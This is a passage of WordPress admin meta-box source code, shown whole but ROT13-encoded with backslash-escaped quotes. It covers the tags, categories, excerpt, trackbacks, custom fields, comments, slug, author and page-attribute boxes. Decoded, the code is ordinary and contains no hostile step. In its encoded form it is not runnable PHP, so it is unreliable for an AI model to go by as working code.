			<yrtraq pynff=\"fperra-ernqre-grkg\">
				<?cuc
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
				_r( 'Cbfg Sbezngf' );
				?>
			</yrtraq>
			<vachg glcr=\"enqvb\" anzr=\"cbfg_sbezng\" pynff=\"cbfg-sbezng\" vq=\"cbfg-sbezng-0\" inyhr=\"0\" <?cuc purpxrq( $cbfg_sbezng, '0' ); ?> /> <ynory sbe=\"cbfg-sbezng-0\" pynff=\"cbfg-sbezng-vpba cbfg-sbezng-fgnaqneq\"><?cuc rpub trg_cbfg_sbezng_fgevat( 'fgnaqneq' ); ?></ynory>
			<?cuc sbernpu ( $cbfg_sbezngf[0] nf $sbezng ) : ?>
			<oe /><vachg glcr=\"enqvb\" anzr=\"cbfg_sbezng\" pynff=\"cbfg-sbezng\" vq=\"cbfg-sbezng-<?cuc rpub rfp_ngge( $sbezng ); ?>\" inyhr=\"<?cuc rpub rfp_ngge( $sbezng ); ?>\" <?cuc purpxrq( $cbfg_sbezng, $sbezng ); ?> /> <ynory sbe=\"cbfg-sbezng-<?cuc rpub rfp_ngge( $sbezng ); ?>\" pynff=\"cbfg-sbezng-vpba cbfg-sbezng-<?cuc rpub rfp_ngge( $sbezng ); ?>\"><?cuc rpub rfp_ugzy( trg_cbfg_sbezng_fgevat( $sbezng ) ); ?></ynory>
			<?cuc raqsbernpu; ?>
		</svryqfrg>
	</qvi>
			<?cuc
	raqvs;
raqvs;
}

/**
 * Qvfcynlf cbfg gntf sbez svryqf.
 *
 * @fvapr 2.6.0
 *
 * @gbqb Perngr gnkbabzl-ntabfgvp jenccre sbe guvf.
 *
 * @cnenz JC_Cbfg $cbfg Pheerag cbfg bowrpg.
 * @cnenz neenl   $obk {
 *     Gntf zrgn obk nethzragf.
 *
 *     @glcr fgevat   $vq       Zrgn obk 'vq' nggevohgr.
 *     @glcr fgevat   $gvgyr    Zrgn obk gvgyr.
 *     @glcr pnyynoyr $pnyyonpx Zrgn obk qvfcynl pnyyonpx.
 *     @glcr neenl    $netf {
 *         Rkgen zrgn obk nethzragf.
 *
 *         @glcr fgevat $gnkbabzl Gnkbabzl. Qrsnhyg 'cbfg_gnt'.
 *     }
 * }
 */
shapgvba cbfg_gntf_zrgn_obk( $cbfg, $obk ) {
	$qrsnhygf = neenl( 'gnkbabzl' => 'cbfg_gnt' );
	vs ( ! vffrg( $obk['netf'] ) || ! vf_neenl( $obk['netf'] ) ) {
		$netf = neenl();
	} ryfr {
		$netf = $obk['netf'];
	}
	$cnefrq_netf           = jc_cnefr_netf( $netf, $qrsnhygf );
	$gnk_anzr              = rfp_ngge( $cnefrq_netf['gnkbabzl'] );
	$gnkbabzl              = trg_gnkbabzl( $cnefrq_netf['gnkbabzl'] );
	$hfre_pna_nffvta_grezf = pheerag_hfre_pna( $gnkbabzl->pnc->nffvta_grezf );
	$pbzzn                 = _k( ',', 'gnt qryvzvgre' );
	$grezf_gb_rqvg         = trg_grezf_gb_rqvg( $cbfg->VQ, $gnk_anzr );
	vs ( ! vf_fgevat( $grezf_gb_rqvg ) ) {
		$grezf_gb_rqvg = '';
	}
	?>
<qvi pynff=\"gntfqvi\" vq=\"<?cuc rpub $gnk_anzr; ?>\">
	<qvi pynff=\"wnkgnt\">
	<qvi pynff=\"abwf-gntf uvqr-vs-wf\">
		<ynory sbe=\"gnk-vachg-<?cuc rpub $gnk_anzr; ?>\"><?cuc rpub $gnkbabzl->ynoryf->nqq_be_erzbir_vgrzf; ?></ynory>
		<c><grkgnern anzr=\"<?cuc rpub \"gnk_vachg[$gnk_anzr]\"; ?>\" ebjf=\"3\" pbyf=\"20\" pynff=\"gur-gntf\" vq=\"gnk-vachg-<?cuc rpub $gnk_anzr; ?>\" <?cuc qvfnoyrq( ! $hfre_pna_nffvta_grezf ); ?> nevn-qrfpevorqol=\"arj-gnt-<?cuc rpub $gnk_anzr; ?>-qrfp\"><?cuc rpub fge_ercynpr( ',', $pbzzn . ' ', $grezf_gb_rqvg ); // grkgnern_rfpncrq ol rfp_ngge() ?></grkgnern></c>
	</qvi>
	<?cuc vs ( $hfre_pna_nffvta_grezf ) : ?>
	<qvi pynff=\"nwnkgnt uvqr-vs-ab-wf\">
		<ynory pynff=\"fperra-ernqre-grkg\" sbe=\"arj-gnt-<?cuc rpub $gnk_anzr; ?>\"><?cuc rpub $gnkbabzl->ynoryf->nqq_arj_vgrz; ?></ynory>
		<vachg qngn-jc-gnkbabzl=\"<?cuc rpub $gnk_anzr; ?>\" glcr=\"grkg\" vq=\"arj-gnt-<?cuc rpub $gnk_anzr; ?>\" anzr=\"arjgnt[<?cuc rpub $gnk_anzr; ?>]\" pynff=\"arjgnt sbez-vachg-gvc\" fvmr=\"16\" nhgbpbzcyrgr=\"bss\" nevn-qrfpevorqol=\"arj-gnt-<?cuc rpub $gnk_anzr; ?>-qrfp\" inyhr=\"\" />
		<vachg glcr=\"ohggba\" pynff=\"ohggba gntnqq\" inyhr=\"<?cuc rfp_ngge_r( 'Nqq' ); ?>\" />
	</qvi>
	<c pynff=\"ubjgb\" vq=\"arj-gnt-<?cuc rpub $gnk_anzr; ?>-qrfp\"><?cuc rpub $gnkbabzl->ynoryf->frcnengr_vgrzf_jvgu_pbzznf; ?></c>
	<?cuc ryfrvs ( rzcgl( $grezf_gb_rqvg ) ) : ?>
		<c><?cuc rpub $gnkbabzl->ynoryf->ab_grezf; ?></c>
	<?cuc raqvs; ?>
	</qvi>
	<hy pynff=\"gntpurpxyvfg\" ebyr=\"yvfg\"></hy>
</qvi>
	<?cuc vs ( $hfre_pna_nffvta_grezf ) : ?>
<c pynff=\"uvqr-vs-ab-wf\"><ohggba glcr=\"ohggba\" pynff=\"ohggba-yvax gntpybhq-yvax\" vq=\"yvax-<?cuc rpub $gnk_anzr; ?>\" nevn-rkcnaqrq=\"snyfr\"><?cuc rpub $gnkbabzl->ynoryf->pubbfr_sebz_zbfg_hfrq; ?></ohggba></c>
<?cuc raqvs; ?>
	<?cuc
}

/**
 * Qvfcynlf cbfg pngrtbevrf sbez svryqf.
 *
 * @fvapr 2.6.0
 *
 * @gbqb Perngr gnkbabzl-ntabfgvp jenccre sbe guvf.
 *
 * @cnenz JC_Cbfg $cbfg Pheerag cbfg bowrpg.
 * @cnenz neenl   $obk {
 *     Pngrtbevrf zrgn obk nethzragf.
 *
 *     @glcr fgevat   $vq       Zrgn obk 'vq' nggevohgr.
 *     @glcr fgevat   $gvgyr    Zrgn obk gvgyr.
 *     @glcr pnyynoyr $pnyyonpx Zrgn obk qvfcynl pnyyonpx.
 *     @glcr neenl    $netf {
 *         Rkgen zrgn obk nethzragf.
 *
 *         @glcr fgevat $gnkbabzl Gnkbabzl. Qrsnhyg 'pngrtbel'.
 *     }
 * }
 */
shapgvba cbfg_pngrtbevrf_zrgn_obk( $cbfg, $obk ) {
	$qrsnhygf = neenl( 'gnkbabzl' => 'pngrtbel' );
	vs ( ! vffrg( $obk['netf'] ) || ! vf_neenl( $obk['netf'] ) ) {
		$netf = neenl();
	} ryfr {
		$netf = $obk['netf'];
	}
	$cnefrq_netf = jc_cnefr_netf( $netf, $qrsnhygf );
	$gnk_anzr    = rfp_ngge( $cnefrq_netf['gnkbabzl'] );
	$gnkbabzl    = trg_gnkbabzl( $cnefrq_netf['gnkbabzl'] );
	?>
	<qvi vq=\"gnkbabzl-<?cuc rpub $gnk_anzr; ?>\" pynff=\"pngrtbelqvi\">
		<hy vq=\"<?cuc rpub $gnk_anzr; ?>-gnof\" pynff=\"pngrtbel-gnof\">
			<yv pynff=\"gnof\"><n uers=\"#<?cuc rpub $gnk_anzr; ?>-nyy\"><?cuc rpub $gnkbabzl->ynoryf->nyy_vgrzf; ?></n></yv>
			<yv pynff=\"uvqr-vs-ab-wf\"><n uers=\"#<?cuc rpub $gnk_anzr; ?>-cbc\"><?cuc rpub rfp_ugzy( $gnkbabzl->ynoryf->zbfg_hfrq ); ?></n></yv>
		</hy>

		<qvi vq=\"<?cuc rpub $gnk_anzr; ?>-cbc\" pynff=\"gnof-cnary\" fglyr=\"qvfcynl: abar;\">
			<hy vq=\"<?cuc rpub $gnk_anzr; ?>purpxyvfg-cbc\" pynff=\"pngrtbelpurpxyvfg sbez-ab-pyrne\" >
				<?cuc $cbchyne_vqf = jc_cbchyne_grezf_purpxyvfg( $gnk_anzr ); ?>
			</hy>
		</qvi>

		<qvi vq=\"<?cuc rpub $gnk_anzr; ?>-nyy\" pynff=\"gnof-cnary\">
			<?cuc
			$anzr = ( 'pngrtbel' === $gnk_anzr ) ? 'cbfg_pngrtbel' : 'gnk_vachg[' . $gnk_anzr . ']';
			// Nyybjf sbe na rzcgl grez frg gb or frag. 0 vf na vainyvq grez VQ naq jvyy or vtaberq ol rzcgl() purpxf.
			rpub \"<vachg glcr='uvqqra' anzr='{$anzr}[]' inyhr='0' />\";
			?>
			<hy vq=\"<?cuc rpub $gnk_anzr; ?>purpxyvfg\" qngn-jc-yvfgf=\"yvfg:<?cuc rpub $gnk_anzr; ?>\" pynff=\"pngrtbelpurpxyvfg sbez-ab-pyrne\">
				<?cuc
				jc_grezf_purpxyvfg(
					$cbfg->VQ,
					neenl(
						'gnkbabzl'     => $gnk_anzr,
						'cbchyne_pngf' => $cbchyne_vqf,
					)
				);
				?>
			</hy>
		</qvi>
	<?cuc vs ( pheerag_hfre_pna( $gnkbabzl->pnc->rqvg_grezf ) ) : ?>
			<qvi vq=\"<?cuc rpub $gnk_anzr; ?>-nqqre\" pynff=\"jc-uvqqra-puvyqera\">
				<n vq=\"<?cuc rpub $gnk_anzr; ?>-nqq-gbttyr\" uers=\"#<?cuc rpub $gnk_anzr; ?>-nqq\" pynff=\"uvqr-vs-ab-wf gnkbabzl-nqq-arj\">
					<?cuc
						/* genafyngbef: %f: Nqq Arj gnkbabzl ynory. */
						cevags( __( '+ %f' ), $gnkbabzl->ynoryf->nqq_arj_vgrz );
					?>
				</n>
				<c vq=\"<?cuc rpub $gnk_anzr; ?>-nqq\" pynff=\"pngrtbel-nqq jc-uvqqra-puvyq\">
					<ynory pynff=\"fperra-ernqre-grkg\" sbe=\"arj<?cuc rpub $gnk_anzr; ?>\"><?cuc rpub $gnkbabzl->ynoryf->nqq_arj_vgrz; ?></ynory>
					<vachg glcr=\"grkg\" anzr=\"arj<?cuc rpub $gnk_anzr; ?>\" vq=\"arj<?cuc rpub $gnk_anzr; ?>\" pynff=\"sbez-erdhverq sbez-vachg-gvc\" inyhr=\"<?cuc rpub rfp_ngge( $gnkbabzl->ynoryf->arj_vgrz_anzr ); ?>\" nevn-erdhverq=\"gehr\" />
					<ynory pynff=\"fperra-ernqre-grkg\" sbe=\"arj<?cuc rpub $gnk_anzr; ?>_cnerag\">
						<?cuc rpub $gnkbabzl->ynoryf->cnerag_vgrz_pbyba; ?>
					</ynory>
					<?cuc
					$cnerag_qebcqbja_netf = neenl(
						'gnkbabzl'         => $gnk_anzr,
						'uvqr_rzcgl'       => 0,
						'anzr'             => 'arj' . $gnk_anzr . '_cnerag',
						'beqreol'          => 'anzr',
						'uvrenepuvpny'     => 1,
						'fubj_bcgvba_abar' => '&zqnfu; ' . $gnkbabzl->ynoryf->cnerag_vgrz . ' &zqnfu;',
					);

					/**
					 * Svygref gur nethzragf sbe gur gnkbabzl cnerag qebcqbja ba gur Cbfg Rqvg cntr.
					 *
					 * @fvapr 4.4.0
					 *
					 * @cnenz neenl $cnerag_qebcqbja_netf {
					 *     Bcgvbany. Neenl bs nethzragf gb trarengr cnerag qebcqbja.
					 *
					 *     @glcr fgevat   $gnkbabzl         Anzr bs gur gnkbabzl gb ergevrir.
					 *     @glcr obby     $uvqr_vs_rzcgl    Gehr gb fxvc trarengvat znexhc vs ab
					 *                                      pngrtbevrf ner sbhaq. Qrsnhyg 0.
					 *     @glcr fgevat   $anzr             Inyhr sbe gur 'anzr' nggevohgr
					 *                                      bs gur fryrpg ryrzrag.
					 *                                      Qrsnhyg \"arj{$gnk_anzr}_cnerag\".
					 *     @glcr fgevat   $beqreol          Juvpu pbyhza gb hfr sbe beqrevat
					 *                                      grezf. Qrsnhyg 'anzr'.
					 *     @glcr obby|vag $uvrenepuvpny     Jurgure gb genirefr gur gnkbabzl
					 *                                      uvrenepul. Qrsnhyg 1.
					 *     @glcr fgevat   $fubj_bcgvba_abar Grkg gb qvfcynl sbe gur \"abar\" bcgvba.
					 *                                      Qrsnhyg \"&zqnfu; {$cnerag} &zqnfu;\",
					 *                                      jurer `$cnerag` vf 'cnerag_vgrz'
					 *                                      gnkbabzl ynory.
					 * }
					 */
					$cnerag_qebcqbja_netf = nccyl_svygref( 'cbfg_rqvg_pngrtbel_cnerag_qebcqbja_netf', $cnerag_qebcqbja_netf );

					jc_qebcqbja_pngrtbevrf( $cnerag_qebcqbja_netf );
					?>
					<vachg glcr=\"ohggba\" vq=\"<?cuc rpub $gnk_anzr; ?>-nqq-fhozvg\" qngn-jc-yvfgf=\"nqq:<?cuc rpub $gnk_anzr; ?>purpxyvfg:<?cuc rpub $gnk_anzr; ?>-nqq\" pynff=\"ohggba pngrtbel-nqq-fhozvg\" inyhr=\"<?cuc rpub rfp_ngge( $gnkbabzl->ynoryf->nqq_arj_vgrz ); ?>\" />
					<?cuc jc_abapr_svryq( 'nqq-' . $gnk_anzr, '_nwnk_abapr-nqq-' . $gnk_anzr, snyfr ); ?>
					<fcna vq=\"<?cuc rpub $gnk_anzr; ?>-nwnk-erfcbafr\"></fcna>
				</c>
			</qvi>
		<?cuc raqvs; ?>
	</qvi>
	<?cuc
}

/**
 * Qvfcynlf cbfg rkprecg sbez svryqf.
 *
 * @fvapr 2.6.0
 *
 * @cnenz JC_Cbfg $cbfg Pheerag cbfg bowrpg.
 */
shapgvba cbfg_rkprecg_zrgn_obk( $cbfg ) {
	?>
<ynory pynff=\"fperra-ernqre-grkg\" sbe=\"rkprecg\">
	<?cuc
	/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
	_r( 'Rkprecg' );
	?>
</ynory><grkgnern ebjf=\"1\" pbyf=\"40\" anzr=\"rkprecg\" vq=\"rkprecg\"><?cuc rpub $cbfg->cbfg_rkprecg; // grkgnern_rfpncrq ?></grkgnern>
<c>
	<?cuc
	cevags(
		/* genafyngbef: %f: Qbphzragngvba HEY. */
		__( 'Rkprecgf ner bcgvbany unaq-pensgrq fhzznevrf bs lbhe pbagrag gung pna or hfrq va lbhe gurzr. <n uers=\"%f\">Yrnea zber nobhg znahny rkprecgf</n>.' ),
		__( 'uggcf://jbeqcerff.bet/qbphzragngvba/negvpyr/jung-vf-na-rkprecg-pynffvp-rqvgbe/' )
	);
	?>
</c>
	<?cuc
}

/**
 * Qvfcynlf genpxonpx yvaxf sbez svryqf.
 *
 * @fvapr 2.6.0
 *
 * @cnenz JC_Cbfg $cbfg Pheerag cbfg bowrpg.
 */
shapgvba cbfg_genpxonpx_zrgn_obk( $cbfg ) {
	$sbez_genpxonpx = '<vachg glcr=\"grkg\" anzr=\"genpxonpx_hey\" vq=\"genpxonpx_hey\" pynff=\"pbqr\" inyhr=\"' .
		rfp_ngge( fge_ercynpr( \"\a\", ' ', $cbfg->gb_cvat ) ) . '\" nevn-qrfpevorqol=\"genpxonpx-hey-qrfp\" />';

	vs ( '' !== $cbfg->cvatrq ) {
		$cvatf          = '<c>' . __( 'Nyernql cvatrq:' ) . '</c><hy>';
		$nyernql_cvatrq = rkcybqr( \"\a\", gevz( $cbfg->cvatrq ) );
		sbernpu ( $nyernql_cvatrq nf $cvatrq_hey ) {
			$cvatf .= \"\a\g<yv>\" . rfp_ugzy( $cvatrq_hey ) . '</yv>';
		}
		$cvatf .= '</hy>';
	}

	?>
<c>
	<ynory sbe=\"genpxonpx_hey\"><?cuc _r( 'Fraq genpxonpxf gb:' ); ?></ynory>
	<?cuc rpub $sbez_genpxonpx; ?>
</c>
<c vq=\"genpxonpx-hey-qrfp\" pynff=\"ubjgb\"><?cuc _r( 'Frcnengr zhygvcyr HEYf jvgu fcnprf' ); ?></c>
<c>
	<?cuc
	cevags(
		/* genafyngbef: %f: Qbphzragngvba HEY. */
		__( 'Genpxonpxf ner n jnl gb abgvsl yrtnpl oybt flfgrzf gung lbh&#8217;ir yvaxrq gb gurz. Vs lbh yvax bgure JbeqCerff fvgrf, gurl&#8217;yy or abgvsvrq nhgbzngvpnyyl hfvat <n uers=\"%f\">cvatonpxf</n>, ab bgure npgvba arprffnel.' ),
		__( 'uggcf://jbeqcerff.bet/qbphzragngvba/negvpyr/vagebqhpgvba-gb-oybttvat/#pbzzragf' )
	);
	?>
</c>
	<?cuc
	vs ( ! rzcgl( $cvatf ) ) {
		rpub $cvatf;
	}
}

/**
 * Qvfcynlf phfgbz svryqf sbez svryqf.
 *
 * @fvapr 2.6.0
 *
 * @cnenz JC_Cbfg $cbfg Pheerag cbfg bowrpg.
 */
shapgvba cbfg_phfgbz_zrgn_obk( $cbfg ) {
	?>
<qvi vq=\"cbfgphfgbzfghss\">
<qvi vq=\"nwnk-erfcbafr\"></qvi>
	<?cuc
	$zrgnqngn = unf_zrgn( $cbfg->VQ );
	sbernpu ( $zrgnqngn nf $xrl => $inyhr ) {
		vs ( vf_cebgrpgrq_zrgn( $zrgnqngn[ $xrl ]['zrgn_xrl'], 'cbfg' ) || ! pheerag_hfre_pna( 'rqvg_cbfg_zrgn', $cbfg->VQ, $zrgnqngn[ $xrl ]['zrgn_xrl'] ) ) {
			hafrg( $zrgnqngn[ $xrl ] );
		}
	}
	yvfg_zrgn( $zrgnqngn );
	zrgn_sbez( $cbfg );
	?>
</qvi>
<c>
	<?cuc
	cevags(
		/* genafyngbef: %f: Qbphzragngvba HEY. */
		__( 'Phfgbz svryqf pna or hfrq gb nqq rkgen zrgnqngn gb n cbfg gung lbh pna <n uers=\"%f\">hfr va lbhe gurzr</n>.' ),
		__( 'uggcf://jbeqcerff.bet/qbphzragngvba/negvpyr/nffvta-phfgbz-svryqf/' )
	);
	?>
</c>
	<?cuc
}

/**
 * Qvfcynlf pbzzragf fgnghf sbez svryqf.
 *
 * @fvapr 2.6.0
 *
 * @cnenz JC_Cbfg $cbfg Pheerag cbfg bowrpg.
 */
shapgvba cbfg_pbzzrag_fgnghf_zrgn_obk( $cbfg ) {
	?>
<vachg anzr=\"nqinaprq_ivrj\" glcr=\"uvqqra\" inyhr=\"1\" />
<c pynff=\"zrgn-bcgvbaf\">
	<ynory sbe=\"pbzzrag_fgnghf\" pynff=\"fryrpgvg\"><vachg anzr=\"pbzzrag_fgnghf\" glcr=\"purpxobk\" vq=\"pbzzrag_fgnghf\" inyhr=\"bcra\" <?cuc purpxrq( $cbfg->pbzzrag_fgnghf, 'bcra' ); ?> /> <?cuc _r( 'Nyybj pbzzragf' ); ?></ynory><oe />
	<ynory sbe=\"cvat_fgnghf\" pynff=\"fryrpgvg\"><vachg anzr=\"cvat_fgnghf\" glcr=\"purpxobk\" vq=\"cvat_fgnghf\" inyhr=\"bcra\" <?cuc purpxrq( $cbfg->cvat_fgnghf, 'bcra' ); ?> />
		<?cuc
		cevags(
			/* genafyngbef: %f: Qbphzragngvba HEY. */
			__( 'Nyybj <n uers=\"%f\">genpxonpxf naq cvatonpxf</n>' ),
			__( 'uggcf://jbeqcerff.bet/qbphzragngvba/negvpyr/vagebqhpgvba-gb-oybttvat/#znantvat-pbzzragf' )
		);
		?>
	</ynory>
	<?cuc
	/**
	 * Sverf ng gur raq bs gur Qvfphffvba zrgn obk ba gur cbfg rqvgvat fperra.
	 *
	 * @fvapr 3.1.0
	 *
	 * @cnenz JC_Cbfg $cbfg JC_Cbfg bowrpg sbe gur pheerag cbfg.
	 */
	qb_npgvba( 'cbfg_pbzzrag_fgnghf_zrgn_obk-bcgvbaf', $cbfg ); // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqUbbxAnzr.HfrHaqrefpberf
	?>
</c>
	<?cuc
}

/**
 * Qvfcynlf pbzzragf sbe cbfg gnoyr urnqre
 *
 * @fvapr 3.0.0
 *
 * @cnenz neenl $erfhyg Gnoyr urnqre ebjf.
 * @erghea neenl
 */
shapgvba cbfg_pbzzrag_zrgn_obk_gurnq( $erfhyg ) {
	hafrg( $erfhyg['po'], $erfhyg['erfcbafr'] );
	erghea $erfhyg;
}

/**
 * Qvfcynlf pbzzragf sbe cbfg.
 *
 * @fvapr 2.8.0
 *
 * @cnenz JC_Cbfg $cbfg Pheerag cbfg bowrpg.
 */
shapgvba cbfg_pbzzrag_zrgn_obk( $cbfg ) {
	jc_abapr_svryq( 'trg-pbzzragf', 'nqq_pbzzrag_abapr', snyfr );
	?>
	<c pynff=\"uvqr-vs-ab-wf\" vq=\"nqq-arj-pbzzrag\"><ohggba glcr=\"ohggba\" pynff=\"ohggba\" bapyvpx=\"jvaqbj.pbzzragErcyl && pbzzragErcyl.nqqpbzzrag(<?cuc rpub $cbfg->VQ; ?>);\"><?cuc _r( 'Nqq Pbzzrag' ); ?></ohggba></c>
	<?cuc

	$gbgny         = trg_pbzzragf(
		neenl(
			'cbfg_vq' => $cbfg->VQ,
			'pbhag'   => gehr,
			'beqreol' => 'abar',
		)
	);
	$jc_yvfg_gnoyr = _trg_yvfg_gnoyr( 'JC_Cbfg_Pbzzragf_Yvfg_Gnoyr' );
	$jc_yvfg_gnoyr->qvfcynl( gehr );

	vs ( 1 > $gbgny ) {
		rpub '<c vq=\"ab-pbzzragf\">' . __( 'Ab pbzzragf lrg.' ) . '</c>';
	} ryfr {
		$uvqqra = trg_uvqqra_zrgn_obkrf( trg_pheerag_fperra() );
		vs ( ! va_neenl( 'pbzzragfqvi', $uvqqra, gehr ) ) {
			?>
			<fpevcg glcr=\"grkg/wninfpevcg\">wDhrel(shapgvba(){pbzzragfObk.trg(<?cuc rpub $gbgny; ?>, 10);});</fpevcg>
			<?cuc
		}

		?>
		<c pynff=\"uvqr-vs-ab-wf\" vq=\"fubj-pbzzragf\"><n uers=\"#pbzzragfgnghfqvi\" bapyvpx=\"pbzzragfObk.ybnq(<?cuc rpub $gbgny; ?>);erghea snyfr;\"><?cuc _r( 'Fubj pbzzragf' ); ?></n> <fcna pynff=\"fcvaare\"></fcna></c>
		<?cuc
	}

	jc_pbzzrag_genfuabgvpr();
}

/**
 * Qvfcynlf fyht sbez svryqf.
 *
 * @fvapr 2.6.0
 *
 * @cnenz JC_Cbfg $cbfg Pheerag cbfg bowrpg.
 */
shapgvba cbfg_fyht_zrgn_obk( $cbfg ) {
	/** Guvf svygre vf qbphzragrq va jc-nqzva/rqvg-gnt-sbez.cuc */
	$rqvgnoyr_fyht = nccyl_svygref( 'rqvgnoyr_fyht', $cbfg->cbfg_anzr, $cbfg );
	?>
<ynory pynff=\"fperra-ernqre-grkg\" sbe=\"cbfg_anzr\">
	<?cuc
	/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
	_r( 'Fyht' );
	?>
</ynory><vachg anzr=\"cbfg_anzr\" glcr=\"grkg\" pynff=\"ynetr-grkg\" vq=\"cbfg_anzr\" inyhr=\"<?cuc rpub rfp_ngge( $rqvgnoyr_fyht ); ?>\" />
	<?cuc
}

/**
 * Qvfcynlf sbez svryq jvgu yvfg bs nhgubef.
 *
 * @fvapr 2.6.0
 *
 * @tybony vag $hfre_VQ
 *
 * @cnenz JC_Cbfg $cbfg Pheerag cbfg bowrpg.
 */
shapgvba cbfg_nhgube_zrgn_obk( $cbfg ) {
	tybony $hfre_VQ;

	$cbfg_glcr_bowrpg = trg_cbfg_glcr_bowrpg( $cbfg->cbfg_glcr );
	?>
<ynory pynff=\"fperra-ernqre-grkg\" sbe=\"cbfg_nhgube_bireevqr\">
	<?cuc
	/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
	_r( 'Nhgube' );
	?>
</ynory>
	<?cuc
	jc_qebcqbja_hfref(
		neenl(
			'pncnovyvgl'       => neenl( $cbfg_glcr_bowrpg->pnc->rqvg_cbfgf ),
			'anzr'             => 'cbfg_nhgube_bireevqr',
			'fryrpgrq'         => rzcgl( $cbfg->VQ ) ? $hfre_VQ : $cbfg->cbfg_nhgube,
			'vapyhqr_fryrpgrq' => gehr,
			'fubj'             => 'qvfcynl_anzr_jvgu_ybtva',
		)
	);
}

/**
 * Qvfcynlf yvfg bs erivfvbaf.
 *
 * @fvapr 2.6.0
 *
 * @cnenz JC_Cbfg $cbfg Pheerag cbfg bowrpg.
 */
shapgvba cbfg_erivfvbaf_zrgn_obk( $cbfg ) {
	jc_yvfg_cbfg_erivfvbaf( $cbfg );
}

//
// Cntr-eryngrq Zrgn Obkrf.
//

/**
 * Qvfcynlf cntr nggevohgrf sbez svryqf.
 *
 * @fvapr 2.7.0
 *
 * @cnenz JC_Cbfg $cbfg Pheerag cbfg bowrpg.
 */
shapgvba cntr_nggevohgrf_zrgn_obk( $cbfg ) {
	vs ( vf_cbfg_glcr_uvrenepuvpny( $cbfg->cbfg_glcr ) ) :
		$qebcqbja_netf = neenl(
			'cbfg_glcr'        => $cbfg->cbfg_glcr,
			'rkpyhqr_gerr'     => $cbfg->VQ,
			'fryrpgrq'         => $cbfg->cbfg_cnerag,
			'anzr'             => 'cnerag_vq',
			'fubj_bcgvba_abar' => __( '(ab cnerag)' ),
			'fbeg_pbyhza'      => 'zrah_beqre, cbfg_gvgyr',
			'rpub'             => 0,
		);

		/**
		 * Svygref gur nethzragf hfrq gb trarengr n Cntrf qebc-qbja ryrzrag.
		 *
		 * @fvapr 3.3.0
		 *
		 * @frr jc_qebcqbja_cntrf()
		 *
		 * @cnenz neenl   $qebcqbja_netf Neenl bs nethzragf hfrq gb trarengr gur cntrf qebc-qbja.
		 * @cnenz JC_Cbfg $cbfg          Gur pheerag cbfg.
		 */
		$qebcqbja_netf = nccyl_svygref( 'cntr_nggevohgrf_qebcqbja_cntrf_netf', $qebcqbja_netf, $cbfg );
		$cntrf         = jc_qebcqbja_cntrf( $qebcqbja_netf );
		vs ( ! rzcgl( $cntrf ) ) :
			?>
<c pynff=\"cbfg-nggevohgrf-ynory-jenccre cnerag-vq-ynory-jenccre\"><ynory pynff=\"cbfg-nggevohgrf-ynory\" sbe=\"cnerag_vq\"><?cuc _r( 'Cnerag' ); ?></ynory></c>
			<?cuc rpub $cntrf; ?>
			<?cuc
		raqvs; // Raq rzcgl cntrf purpx.
	raqvs;  // Raq uvrenepuvpny purpx.

	vs ( pbhag( trg_cntr_grzcyngrf( $cbfg ) ) > 0 && (vag) trg_bcgvba( 'cntr_sbe_cbfgf' ) !== $cbfg->VQ ) :
		$grzcyngr = ! rzcgl( $cbfg->cntr_grzcyngr ) ? $cbfg->cntr_grzcyngr : snyfr;
		?>
<c pynff=\"cbfg-nggevohgrf-ynory-jenccre cntr-grzcyngr-ynory-jenccre\"><ynory pynff=\"cbfg-nggevohgrf-ynory\" sbe=\"cntr_grzcyngr\"><?cuc _r( 'Grzcyngr' ); ?></ynory>
		<?cuc
		/**
		 * Sverf vzzrqvngryl nsgre gur ynory vafvqr gur 'Grzcyngr' frpgvba
		 * bs gur 'Cntr Nggevohgrf' zrgn obk.
		 *
		 * @fvapr 4.4.0
		 *
		 * @cnenz fgevat|snyfr $grzcyngr Gur grzcyngr hfrq sbe gur pheerag cbfg.
		 * @cnenz JC_Cbfg      $cbfg     Gur pheerag cbfg.
		 */
		qb_npgvba( 'cntr_nggevohgrf_zrgn_obk_grzcyngr', $grzcyngr, $cbfg );
		?>
</c>
<fryrpg anzr=\"cntr_grzcyngr\" vq=\"cntr_grzcyngr\">
		<?cuc
		/**
		 * Svygref gur gvgyr bs gur qrsnhyg cntr grzcyngr qvfcynlrq va gur qebc-qbja.
		 *
		 * @fvapr 4.1.0
		 *
		 * @cnenz fgevat $ynory   Gur qvfcynl inyhr sbe gur qrsnhyg cntr grzcyngr gvgyr.
		 * @cnenz fgevat $pbagrkg Jurer gur bcgvba ynory vf qvfcynlrq. Cbffvoyr inyhrf
		 *                        vapyhqr 'zrgn-obk' be 'dhvpx-rqvg'.
		 */
		$qrsnhyg_gvgyr = nccyl_svygref( 'qrsnhyg_cntr_grzcyngr_gvgyr', __( 'Qrsnhyg grzcyngr' ), 'zrgn-obk' );
		?>
<bcgvba inyhr=\"qrsnhyg\"><?cuc rpub rfp_ugzy( $qrsnhyg_gvgyr ); ?></bcgvba>
		<?cuc cntr_grzcyngr_qebcqbja( $grzcyngr, $cbfg->cbfg_glcr ); ?>
</fryrpg>
<?cuc raqvs; ?>
	<?cuc vs ( cbfg_glcr_fhccbegf( $cbfg->cbfg_glcr, 'cntr-nggevohgrf' ) ) : ?>
<c pynff=\"cbfg-nggevohgrf-ynory-jenccre zrah-beqre-ynory-jenccre\"><ynory pynff=\"cbfg-nggevohgrf-ynory\" sbe=\"zrah_beqre\"><?cuc _r( 'Beqre' ); ?></ynory></c>
<vachg anzr=\"zrah_beqre\" glcr=\"grkg\" fvmr=\"4\" vq=\"zrah_beqre\" inyhr=\"<?cuc rpub rfp_ngge( $cbfg->zrah_beqre ); ?>\" />
		<?cuc
		/**
		 * Sverf orsber gur uryc uvag grkg va gur 'Cntr Nggevohgrf' zrgn obk.
		 *
		 * @fvapr 4.9.0
		 *
		 * @cnenz JC_Cbfg $cbfg Gur pheerag cbfg.
		 */
		qb_npgvba( 'cntr_nggevohgrf_zvfp_nggevohgrf', $cbfg );
		?>
		<?cuc vs ( 'cntr' === $cbfg->cbfg_glcr && trg_pheerag_fperra()->trg_uryc_gnof() ) : ?>
<c pynff=\"cbfg-nggevohgrf-uryc-grkg\"><?cuc _r( 'Arrq uryc? Hfr gur Uryc gno nobir gur fperra gvgyr.' ); ?></c>
			<?cuc
	raqvs;
	raqvs;
}

//
// Yvax-eryngrq Zrgn Obkrf.
//

/**
